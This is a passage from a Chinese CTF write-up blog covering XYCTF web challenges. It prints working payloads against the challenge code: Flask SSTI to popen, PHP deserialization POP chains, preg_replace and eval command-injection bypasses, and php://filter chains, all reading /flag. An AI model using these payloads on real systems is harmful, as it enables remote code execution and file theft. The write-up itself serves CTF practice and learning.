class="hljs-variable">$XYCTF</span> = <span class="hljs-string">&quot;Warm up&quot;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ez&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$md5</span>) &amp;&amp; <span class="hljs-variable">$md5</span> == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ezez&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$XY</span> == <span class="hljs-variable">$XYCTF</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$XY</span> != <span class="hljs-string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$XY</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;XYCTF_550102591&quot;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level2</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;学这么久,传参不会传?&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>第一步要传入两个值不等但是md5弱比教相等。尝试传入数组或者用字符串弱比教。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">val1</span>=QNKCDZO&amp;val2=s878926199a<br></code></pre></td></tr></table></figure><p>第二步传入值的md5的值等于本身。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">md5</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>e215962017<br></code></pre></td></tr></table></figure><p>第三步可以利用变量覆盖，把原先的覆盖掉，如下图</p><p><img src="/../images/xyctf/warmup.png" alt="warm up"></p><p>，之后进第二个页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;操作你O.o&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);  <span class="hljs-comment">// 我可不会像别人一样设置10来个level</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;有点汗流浃背&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>简要讲一下intval,这个函数会强制把传入的内容转换为数字，但是如果传入的内容是数组就可以进行绕过。</p><p>先尝试post一个a[]&#x3D;1，会显示出操作你0.o</p><p>再审计一下下面的内容,问问万能的chatgpt这是个啥</p><p>$_GET[‘a’] 作为正则表达式模式，$_GET[‘b’] 作为替换的文本或模式，$_GET[‘c’] 作为输入的字符串或数组。具体来说，这段代码是根据从 URL 中获取的参数来执行正则表达式的搜索和替换操作。</p><p>尝试正则几个字母，然后b输入system(‘cat &#x2F;flag’),c再输入几个前面正则的内容就行</p><p>post传入上面的内容对应，上图片。</p><p><img src="/../images/xyctf/warm1.png" alt="warm1"></p><h2 id="ezMD5"><a href="#ezMD5" class="headerlink" title="ezMD5"></a>ezMD5</h2><p>上传两个图片Md5值相同即可，csdn上面有,可以自己搜，最后能出flag.</p><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h2><p>偷偷扫了一下，问题不大吧，&#x2F;flag就能出了<img src="/../images/xyctf/make.png" alt="make"></p><h2 id="ez-make"><a href="#ez-make" class="headerlink" title="ez?make"></a>ez?make</h2><p>本题可以通过两次十六进制绕过，从而得到flag</p><p>先第一次转</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /flag636174202f666c6167<br></code></pre></td></tr></table></figure><p>再转第二次</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">636174202f666c6167</span><span class="hljs-number">363336313734323032663636366336313637</span><br></code></pre></td></tr></table></figure><p>这里提个知识点</p><p>xxd -r 是将十六进制转换回去，-p是以postscript的连续十六进制转储输出。这也叫做纯十六进制转储。</p><p>所有应该为</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">`echo <span class="hljs-string">&quot;363336313734323032663636366336313637&quot;</span>|<span class="hljs-type">xxd</span> -r -p|<span class="hljs-type">xxd</span> -r -p`<br></code></pre></td></tr></table></figure><p>&#96;&#96;是执行语句，执行里面的内容</p><p>xxd -r -p用来转化保持。</p><p><img src="/../images/xyctf/ez%EF%BC%9Fmake.png" alt="ez？make"></p><h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><p>首先猜测用户名是admin,给了字典爆破一下，密码是asdqwe</p><p>进去输入常规的sql和ssit和命令执行都不行</p><p>尝试输入汉字有括号，那我估计就是从这里入手，构造一个flask的注入</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">哈%<span class="hljs-keyword">print</span>(()|attr(request.<span class="hljs-keyword">args</span>.a))|attr(request.<span class="hljs-keyword">args</span>.base)|attr(request.<span class="hljs-keyword">args</span>.sub)()|attr(request.<span class="hljs-keyword">args</span>.getit)(132)|attr(request.<span class="hljs-keyword">args</span>.ini)|attr(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">glo</span>)|attr(request.<span class="hljs-keyword">args</span>.getit)(request.<span class="hljs-keyword">args</span>.p)(request.<span class="hljs-keyword">args</span>.cmd)|attr(request.<span class="hljs-keyword">args</span>.r)()%&amp;a=__class__&amp;base=__base__&amp;sub=__subclasses__&amp;getit=__getitem__&amp;cmd=<span class="hljs-keyword">cat</span> /flag&amp;ini=__init__&amp;<span class="hljs-keyword">glo</span>=__globals__&amp;p=popen&amp;r=<span class="hljs-keyword">read</span><br></code></pre></td></tr></table></figure><p>可以得到flag</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$white_list</span> = [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>]; <br>    <span class="hljs-variable">$cmd_char</span> = <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$cmd_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>)&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$char</span>, <span class="hljs-variable">$white_list</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;really ez?&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure><p>本体只能用白名单上的进行绕过，有\有数字估计是八进制，空格用$&lt;进行绕过。</p><p>累了，上payload吧，利用了简要的拼接。</p><p><img src="/../images/xyctf/rce.png" alt="rce"></p><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>对于反序列化不好的我一点也不ez,先看源码分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 A &lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 B &lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>        <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>;<br>        <span class="hljs-variable">$c</span>=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-variable">$d</span>=<span class="hljs-variable language_">$this</span>-&gt;d;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>)(<span class="hljs-variable">$c</span>)(<span class="hljs-variable">$d</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 C &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xy&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xy&#x27;</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;noooooob!!!&quot;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>还有点长，简单的要分析一下，要得到flag,正常是反向推理。要得到flag大概率是<code>call_user_func($a,$b)($c)($d);</code>这个实现的，简单来说这是个嵌套的函数。<code>__get</code>是调用的成员属性不存在,才会调用。而AAA里的<code>$this-&gt;s-&gt;$p;</code> 可以进行调用一个不存在的从而实现调用。<code>__toString</code>把对象当成字符串调用，通常echo就可以调用成功。<code>echo $this-&gt;c;</code>就可以实现。那么显而易见大概的流程已经出来了。</p><p>CCC::destruct  —&gt; AAA::toString—&gt;BBB::get，这样的大体流程。下面我们上代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>=<span class="hljs-string">&quot;echo system&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span><br><span class="hljs-class"></span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> CCC;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> AAA;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> BBB;<br><span class="hljs-variable">$a</span>-&gt;c=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;s=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$b</span>-&gt;a=<span class="hljs-string">&quot;eval&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure><p>$a&#x3D;new CCC;实例化调用__destruct(),之后就可以通过echo调用__tostring().里面调用<code>$p = $this-&gt;a;</code></p><p>只要给a赋值BBB不存在的变量然后通过return，就能调用__get().</p><p>这里还要介绍一下implode函数，implode函数可以拼接内容，把后面的$b,c,d连起来构成语句</p><p>$c,$d已经赋值好了，还需要post传值<img src="/../images/xyctf/ezpop.png" alt="ezpop"></p><p>$b也可以传入exec,最后还有个小tip,原文都是2A,2B,2C，需要把类后面的属性即CCC后面的1改成2.</p><p>大题思路是这样，中间可能有冗杂的内容，至少把题目写出来了。</p><h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><p><img src="/../images/xyctf/%E7%89%A2%E5%A4%A7.png" alt="牢大"></p><p>so,what can i say,manba out</p><p>这题还是有许多值得学习的知识点的，先简要分析一下。</p><p>cmd的长度不能大于13</p><p>内容禁用的挺多的，如上</p><p>大致思路是需要拼接最后得到的，因为下方有个eval函数。</p><p>既然都禁了那我尝试转义吧，转十六进制可能会出现f,会被禁用，那么我们就转八进制。</p><p><img src="/../images/xyctf/laoda1.png" alt="laoda1"></p><p>处于编码问题我们都是加一个\0,如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">\<span class="hljs-number">0143\0160</span>\<span class="hljs-number">0040\0057</span>\<span class="hljs-number">0146\0154</span>\<span class="hljs-number">0141\0147</span>\<span class="hljs-number">0040\0057</span>\<span class="hljs-number">0166\0141</span>\<span class="hljs-number">0162\0057</span>\<span class="hljs-number">0167\0167</span>\<span class="hljs-number">0167\0057</span>\<span class="hljs-number">0150\0164</span>\<span class="hljs-number">0155\0154</span>\<span class="hljs-number">0057\0061</span>\<span class="hljs-number">0056\0164</span>\<span class="hljs-number">0170\0164</span>\<span class="hljs-number">0012</span>   ，最后的是换号符<br></code></pre></td></tr></table></figure><p>再看前面要过滤man和mamba out,前面可以考虑换行%0A,后面%23注释掉就行</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=%0A<span class="hljs-string">`$_GET[1]`</span>;%23&amp;<span class="hljs-number">1</span>=%24(echo -e <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>反引号用于执行，%24是$,echo -e 用于执行转义，加上面的放入下面的代码中就可以实行。最后再切换到1.txt,得到答案。</p><p><img src="/../images/xyctf/lao2.png" alt="lao2"></p><h2 id="以下为复现（-εZ-¿м-Kε¿"><a href="#以下为复现（-εZ-¿м-Kε¿" class="headerlink" title="以下为复现（  εZ?¿м@Kε¿?"></a>以下为复现（  εZ?¿м@Kε¿?</h2><p><a href="https://blog.csdn.net/ZBraveHeart/article/details/123187908?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171412303116777224485918%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171412303116777224485918&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123187908-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=makefile&spm=1018.2226.3001.4187">知识点</a>，写这题之前可以看看这篇的知识点，简要的了解一下。<img src="/../images/xyctf/%CE%B5Z%C2%BF%D0%BC@K%CE%B5%C2%BF.png" alt="εZ¿м@Kε¿"></p><p>尝试了第一种和第二种都不行，看了其他师傅的wp，考察的可能是真的是makefile的知识点，之前也没搜过这方面的内容，就小学一下吧。这里简单的说一下。</p><p>$符号表示取变量的值，当变量名多于一个字符时，使用”( )”<br>$符的其他用法</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$^</span> 表示所有的依赖文件<br><span class="hljs-variable">$@</span> 表示生成的目标文件<br><span class="hljs-variable">$&lt;</span> 代表第一个依赖文件<br></code></pre></td></tr></table></figure><p>尝试输入内容。<img src="/../images/xyctf/%EF%BC%9F%EF%BC%9F%EF%BC%9F.png" alt="？？？"></p><p>得知当前的依赖文件里面就是flag.</p><p>$&lt;,显示的是&#x2F;flag，那么&lt;$&lt;也就是&lt;&#x2F;flag,由上面得知多于一个字符需要使用括号，那么就先构造**$(&lt;$&lt;)**,我的理解是取进去flag文件</p><p>里面的值，先输入看看，这是下面的回显。</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ocaml"><span class="hljs-type">Nothing</span> <span class="hljs-keyword">to</span> be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-symbol">&#x27;FLAG&#x27;</span>.<br></code></pre></td></tr></table></figure><p>也就是说**$(&lt;$&lt;)**,可能代表的就是flag这个内容，读取我们需要再加个$</p><p><img src="/../images/xyctf/%EF%BC%9F%EF%BC%9F.png" alt="？？"></p><h2 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h2><p>下载文件。先靠着打断点过了一次关发现并不能得到flag,看到文件里面有what’s_this.php，打开网页看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$p</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="hljs-variable">$p</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;waf!&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;php://filter/<span class="hljs-subst">$p</span>/resource=/etc/passwd&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$payload</span>)===<span class="hljs-string">&quot;XYCTF&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>看了wp,可以看一下这位师傅讲的原理，<a href="https://blog.csdn.net/m0_73512445/article/details/134627841">filterchain</a>，简单的来说就是就是base64只能识别[A-Za-z0-9+&#x2F;&#x3D;]，这些其他的不可见字符会自动忽略。原理大致就是最后只要解密成为XYCTF就可以了，这里师傅推荐的脚本，<a href="https://github.com/synacktiv/php_filter_chain_generator">脚本</a>，直接clone下来就可以用了构造一下</p><p><img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B.png" alt="连连看"></p><p>然后再脚本跑一下，<img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B1.png" alt="连连看1"></p><p>最后末尾要改一下，根据题目的设定以及要多解几次base64，多修改几次也就得到flag了。</p><p><img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B2.png" alt="连连看2"></p><h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>哎，看到序列化反序列化就不想写，太菜了，先看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;token === <span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br>    